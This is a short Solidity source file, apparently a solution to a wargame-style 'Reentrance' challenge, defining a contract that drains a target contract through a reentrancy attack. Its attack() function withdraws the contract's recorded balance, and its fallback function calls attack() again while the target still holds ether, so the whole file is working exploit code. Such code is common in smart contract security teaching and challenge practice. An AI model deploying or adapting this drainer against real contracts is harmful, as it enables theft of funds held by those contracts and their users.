// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../interfaces/reentrance.sol";
import "./reentrance.sol";

/**
 * contract with fallback function in order to perform a reentrancy attack
 */
contract reentranceAttack {

    // address payable public target;
    Reentrance public immutable target;
    constructor(address payable targetAddress) {
        target=Reentrance(targetAddress);
    }

// call the target donate() function, sending it come ETH (1/10 of the initial balance)
    function attack() public {
      // get the balance of the present contract
      uint256 whithdraw_amount=target.balanceOf(address(this));
      // execute the withdrawal
      target.withdraw(whithdraw_amount);
    }

  // fallback function
  fallback() payable external {
      // get the total balance of the target contract
      uint total_balance=address(target).balance;
      if (total_balance>0) {
        attack();
      }
  }
}
